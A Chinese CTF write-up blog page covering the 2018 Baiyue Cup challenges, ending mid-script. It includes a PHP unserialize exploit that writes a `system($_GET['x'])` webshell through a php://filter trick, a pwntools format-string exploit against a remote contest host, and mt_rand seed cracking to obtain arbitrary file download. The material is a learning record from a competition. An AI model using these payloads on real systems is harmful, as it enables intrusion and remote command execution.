@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="Purse the balance of everything.">
+  <meta name="keywords" content="CTF, Blog">
+  
+    <link rel="icon" href>
+  
+    
+  <title>福建省2018百越杯线上赛部分题解 | Mads Blog</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/gitalk.css">
+  <script src="/lib/gitalk.min.js"></script>
+  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">
+
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <i class="fas fa-cat" style="margin-right: 10px"></i>
+      <span>Mads Blog</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content aath-body">
+          <h1>福建省2018百越杯线上赛部分题解</h1>
+          
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2018年12月02日</time>
+            
+            
+              | 
+                  <i class="fa fa-tag" aria-hidden="true"></i>
+                
+               
+  <a href="/tags/#CTF" class='tag'>CTF</a>
+
+
+            
+            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年02月17日</time>
+          </div>
+          
+          <p>很开心，我这个菜鸡竟然可以开始做pwn题了，发个wp纪念下。 （虽然是很简单的</p>
+<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="https://i.loli.net/2018/12/01/5c02746289864.png" alt="20181201194539.png"></p>
+<p>找个在线解数独的网站, 输进去后排成一行如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">473615928216984753598237164651892437942376815387451296834529671125768349769143582</span><br></pre></td></tr></table></figure>
+<p>md5后提交.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cee3860fb3f4a52e615fa8aaf3c91f2b&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="血小板天下第一可爱"><a href="#血小板天下第一可爱" class="headerlink" title="血小板天下第一可爱"></a>血小板天下第一可爱</h1><p>将二维码其他两个定位块用PS补齐, 扫码得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a2V5JTNBJTIwTHNiXzFzX2dyM2F0</span><br></pre></td></tr></table></figure>
+<p>base64 解码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: Lsb_1s_gr3at</span><br></pre></td></tr></table></figure>
+<p>提示LSB隐写, 于是用<code>Stegsolve</code>的<code>Data Extract</code>将图片低位提取出来, 然后用AES解密得到flag, 密钥就是<code>Lsb_1s_gr3at</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1_l0ve_LSB~&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="flag-universe"><a href="#flag-universe" class="headerlink" title="flag_universe"></a>flag_universe</h1><p>分析流量包, 是一个FTP传输过程的流量. 从流量中可以看出文件夹有哪些文件</p>
+<p><img src="https://i.loli.net/2018/12/01/5c0275c1d1e11.png" alt="20181201195127.png"></p>
+<p>然后下载了universe.png, 但是好像是因为网络原因, 下载过程不是很顺利, 这导致了诸如<code>foremost</code>、<code>binwalk</code>、<code>tcpxtract</code>等工具提取出来的图片总有残缺, 然后又下载了<code>flag.txt</code>, 内容是<code>ZmxhZ3tUaGlzIGlzIGZha2UgZmxhZyBoYWhhaGF9</code>, base64解码后发现白高兴一场<code>flag{This is fake flag hahaha}</code>. </p>
+<p>接着分析流量, 发现宿主机向ftp主机上传了一张<code>new_universe.png</code>.</p>
+<p><img src="https://i.loli.net/2018/12/01/5c02768678b7a.png" alt="20181201195448.png"></p>
+<p>我们利用<code>wireshark</code>的流追踪工具把两张图片提取出来. 两张图片, 先<code>diff</code>一下, 发现<code>new_universe.png</code>比<code>universe.png</code>大, 确认下确实不是一张图片了. 然后我想到了盲水印, 然后试了下并不是. 之后试了很多种方法, 发现竟然又是LSB? (What the fuck!</p>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Plate_err_klaus_Mail_Life&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="simple-ser"><a href="#simple-ser" class="headerlink" title="simple ser"></a>simple ser</h1><p>给了源码, 那就开始看吧. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $cls; </span><br><span class="line">    <span class="keyword">var</span> $arr; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123; </span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;arr <span class="keyword">as</span> $k =&gt; $v)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;cls-&gt;$v; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $filename = <span class="string">'hello.php'</span>; </span><br><span class="line">    <span class="keyword">var</span> $txt = <span class="string">''</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span>($key == <span class="string">'fileput'</span>)&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fileput(); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;'</span>.htmlspecialchars($key).<span class="string">'&lt;/p&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(    strpos(<span class="keyword">$this</span>-&gt;filename,<span class="string">'../'</span>) !== <span class="keyword">false</span> || </span><br><span class="line">            strpos(<span class="keyword">$this</span>-&gt;filename,<span class="string">'\\'</span>) !== <span class="keyword">false</span>      </span><br><span class="line">        ) <span class="keyword">die</span>(); </span><br><span class="line"></span><br><span class="line">        $content = <span class="string">'&lt;?php die(\'stupid\'); ?&gt;'</span>; </span><br><span class="line">        $content .= <span class="keyword">$this</span>-&gt;txt; </span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename, $content); </span><br><span class="line">        <span class="keyword">return</span> htmlspecialchars($content); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST))&#123; </span><br><span class="line">    $cls = base64_decode($_POST[<span class="string">'ser'</span>]); </span><br><span class="line">    $instance = unserialize($cls); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    $a = <span class="keyword">new</span> cls1(); </span><br><span class="line">    $a-&gt;show(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>顺着源码意思, 基本思路就出来了. 我们的目标是激活<code>cls2</code>的<code>fileput</code>方法写入一个文件. <code>fileput</code>方法可以通过<code>cls2</code>的<code>__get</code>魔术方法激活, 于是我们<code>cls1</code>的<code>cls</code>属性就是<code>cls2</code>, <code>arr</code>中需要有一个<code>v</code>是<code>fileput</code>. 到这里我们就可以激活<code>fileput</code>方法写入一个开头内容总是<code>&lt;?php die(\&#39;stupid\&#39;); ?&gt;</code>的文件. 这里我们可以想到, php中的文件名可以包一层伪协议, 从而控制文件名对应文件的内容. 看<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">这篇</a>, 我们可以用base64的过滤器来绕过。具体payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$c1 = <span class="keyword">new</span> cls1;</span><br><span class="line">$c2 = <span class="keyword">new</span> cls2;</span><br><span class="line">$c2-&gt;filename = <span class="string">'php://filter/write=convert.base64-decode/resource=mads.php'</span>;</span><br><span class="line">$c2-&gt;txt = <span class="string">"PD9waHAgc3lzdGVtKCRfR0VUWyd4J10pOyA/Pg=="</span>;</span><br><span class="line">$c1-&gt;cls = $c2;</span><br><span class="line">$c1-&gt;arr = <span class="keyword">array</span>(<span class="string">"1"</span>=&gt;<span class="string">"fileput"</span>);</span><br><span class="line"></span><br><span class="line">$sc1 = serialize($c1);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($sc1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo base64_encode("<span class="meta">&lt;?php</span> system(\$_GET['x']); <span class="meta">?&gt;</span>");</span></span><br></pre></td></tr></table></figure>
+<p>将序列化的对象传入, 就写入了一个一句话. <code>&lt;?php system(\$_GET[&#39;x&#39;]); ?&gt;</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"ser"</span>: <span class="string">"Tzo0OiJjbHMxIjoyOntzOjM6ImNscyI7Tzo0OiJjbHMyIjoyOntzOjg6ImZpbGVuYW1lIjtzOjU4OiJwaHA6Ly9maWx0ZXIvd3JpdGU9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPW1hZHMucGhwIjtzOjM6InR4dCI7czo0MDoiUEQ5d2FIQWdjM2x6ZEdWdEtDUmZSMFZVV3lkNEoxMHBPeUEvUGc9PSI7fXM6MzoiYXJyIjthOjE6e2k6MTtzOjc6ImZpbGVwdXQiO319="</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://762062d1c2404bdcb437c4635a998747e185496ea2b04f1d.game.ichunqiu.com/'</span></span><br><span class="line">r = requests.post(url = url, data=data)</span><br><span class="line"><span class="comment"># print r.text</span></span><br></pre></td></tr></table></figure>
+<p>读取根目录下<code>flag</code>文件, 得到flag.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0970e0b1-e35f-4795-ad12-276099ae94a0&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="format"><a href="#format" class="headerlink" title="format"></a>format</h1><p>提示的很明显, 是一个格式化字符串漏洞, 逻辑也很简单, 覆盖bss段上一个全局变量值为192就给一个shell. 直接上exp！(没想到第一次在比赛做出来的pwn的wp是这么精简！！！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">secret = <span class="number">0x804a048</span></span><br><span class="line"><span class="comment">#p = process('./format')</span></span><br><span class="line">p = remote(<span class="string">'117.50.13.182'</span>,<span class="number">33865</span>)</span><br><span class="line">payload = p32(secret) + <span class="string">'%0188x%11$n'</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;0e3c9bee-b694-4f9c-b888-e84943037d67&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="Download-it"><a href="#Download-it" class="headerlink" title="Download it"></a>Download it</h1><p>题目提示mt_rand. 搜了一下, php的mt_rand有个伪随机数的种子空间太小可以爆破的问题, 并且是版本通杀的。已经有人用c写了个高效的爆破, <a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">https://github.com/lepiaf/php_mt_seed</a>. 具体分析可以看<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">这里</a>. 看题目.</p>
+<p><img src="https://i.loli.net/2018/12/01/5c026d12885cc.png" alt="20181201191427.png"></p>
+<p>大概浏览之后发现有三个功能页, <code>Download</code>页面可以下载三个静态文件, <code>install.php</code>页面可以看<code>install.php</code>源码, <code>download.php</code>可以看<code>download.php</code>源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* install.php */</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* VSERION = 7.0.30 */</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'install.lock'</span>))&#123;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_rand</span><span class="params">($length)</span></span>&#123;</span><br><span class="line">	$chars = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line">	$randstr = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ ) &#123;</span><br><span class="line">		$randstr .= $chars[ mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>) ];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $randstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wfile</span><span class="params">($filename, $content=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">	$fp  = @fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">	@fwrite($fp,$content);</span><br><span class="line">	@fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wfile(<span class="string">'install.lock'</span>,<span class="string">''</span>);</span><br><span class="line">wfile(gen_rand(<span class="number">8</span>).<span class="string">'.php'</span>, <span class="string">"&lt;?php //flag&#123;*****&#125;"</span>);</span><br><span class="line">wfile(<span class="string">'authcode.php'</span>,<span class="string">"&lt;?php\n/*"</span>.gen_rand(<span class="number">32</span>).<span class="string">'*/?&gt;'</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* download.php */</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*代码加密后用URL传递*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">authcode</span><span class="params">($string, $operation = <span class="string">'DECODE'</span>, $key , $expiry = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	$ckey_length = <span class="number">4</span>; </span><br><span class="line"></span><br><span class="line">	$key = md5($key);</span><br><span class="line">	$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">	$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">	$keyc = $ckey_length ? ($operation == <span class="string">'DECODE'</span> ? substr($string, <span class="number">0</span>, $ckey_length): substr(md5(microtime()), -$ckey_length)) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">	$cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">	$string = $operation == <span class="string">'DECODE'</span> ? base64_decode(substr($string, $ckey_length)) : sprintf(<span class="string">'%010d'</span>, $expiry ? $expiry + time() : <span class="number">0</span>).substr(md5($string.$keyb), <span class="number">0</span>, <span class="number">16</span>).$string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">	$result = <span class="string">''</span>;</span><br><span class="line">	$box = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">	$rndkey = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($operation == <span class="string">'DECODE'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>).$keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $keyc.str_replace(<span class="string">'='</span>, <span class="string">''</span>, base64_encode($result));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_down</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (! file_exists ( $filename )) &#123;    </span><br><span class="line">		<span class="keyword">exit</span> ();    </span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$file = fopen ( $filename, <span class="string">"r"</span> );  </span><br><span class="line">		Header ( <span class="string">"Content-type: application/octet-stream"</span> );    </span><br><span class="line">		Header ( <span class="string">"Accept-Ranges: bytes"</span> );    </span><br><span class="line">		Header ( <span class="string">"Accept-Length: "</span> . filesize ( $filename ) );    </span><br><span class="line">		Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename ); </span><br><span class="line">		<span class="keyword">echo</span> @fread ( $file, filesize ( $filename ) );    </span><br><span class="line">		fclose ( $file );  </span><br><span class="line">		<span class="keyword">exit</span>(); </span><br><span class="line">	&#125;    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=trim(file_get_contents(<span class="string">'authcode.php'</span>));</span><br><span class="line">$key=str_replace(<span class="string">"&lt;?php\n/*"</span>,<span class="string">''</span>,$key);</span><br><span class="line">$key=str_replace(<span class="string">'*/?&gt;'</span>,<span class="string">''</span>,$key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET))&#123;</span><br><span class="line">	$download = authcode($_GET[<span class="string">'download'</span>], <span class="string">'DECODE'</span>,$key);</span><br><span class="line">	<span class="keyword">if</span>($download)&#123;</span><br><span class="line">		parse_str($download, $file);</span><br><span class="line">		@file_down($file[<span class="string">'filename'</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析源码功能可以发现就是一个给经过加密的文件名, 例如<code>filename=mads.php</code>经过<code>authcode</code>函数加密, 将结果传给<code>download.php</code>的<code>download</code>参数就可以下载<code>mads.php</code>. 关键就是需要知道<code>authcode</code>的参数<code>$key</code>就可以任意文件下载了. 而<code>$key</code>是<code>mt_rand()</code>函数生成的, 所以我们是可以得到的. 在<code>$key</code>生成之前还调用了<code>mt_rand()</code>生成了一个文件名, 通过题目给的源码发现里面可能是flag(然而并不是, 坑点). 这里卡了很久, 结果在<code>Download</code>标签查看源码发现了玄机….(做题做的源码都不会看了).</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 部分html源码 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Main component for a primary marketing message or call to action --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"jumbotron container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span>DownLoad<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span>Flag is here, try to get it.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-success col-md-offset-2"</span> <span class="attr">href</span>=<span class="string">"download.php?download=27baEWffY%2FD0cpMkVEVoGejGy4e2rC3kGMgIwbaevC3cjQW92jFZfRhcLvfrkw07ZPiwFQ"</span> &gt;</span>CTF Introduction<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-success col-md-offset-1"</span> <span class="attr">href</span>=<span class="string">"download.php?download=ecefwBCHkfr7%2FiJxJmgISzhE09t%2F3c6ZgGszQloZEmd%2FxPr6iFTdb8vWME1Wa%2F7ZHK%2FBA6qh1A"</span> &gt;</span>DEFCON Introduction<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-success col-md-offset-1"</span> <span class="attr">href</span>=<span class="string">"download.php?download=6ba8aFlAiTCx6gvneNTBrFJmCn%2FSnsbtIgHucODw%2FQs8Geu7RUs7iWZp6dE1BLqjWVuARwY"</span> &gt;</span>FLAG<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">            <span class="comment">&lt;!-- &lt;a class="btn btn-lg btn-success" href="download.php?download=e47dc5Sjdiy%2FO1aTX0nOjboCI3qdNljrSkHZ33lFSqb9mFnMU5j6pv7qSUGLI4vX9dk" &gt;&lt;/a&gt;  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>看到了有行注释掉的下载链接, 下载下来是个名为<code>35hGm34y.php</code>, 内容为<code>&lt;?php //flag{This is fake flag, but it looks useful}</code>的文件. 咦, 看起来这么眼熟, 这难道就是源码中提示的有flag的文件? 我们抱着怀疑试试, 利用得到的<code>gen_rand()</code>函数生成的前6个字符, 再利用上面提到的工具爆破种子, 接着就可以得到<code>$key</code>!. 根据前六个字符生成前六个伪随机数的脚本如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">words = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">print</span> len(words)</span><br><span class="line">key = <span class="string">'35hGm34y'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">print</span> 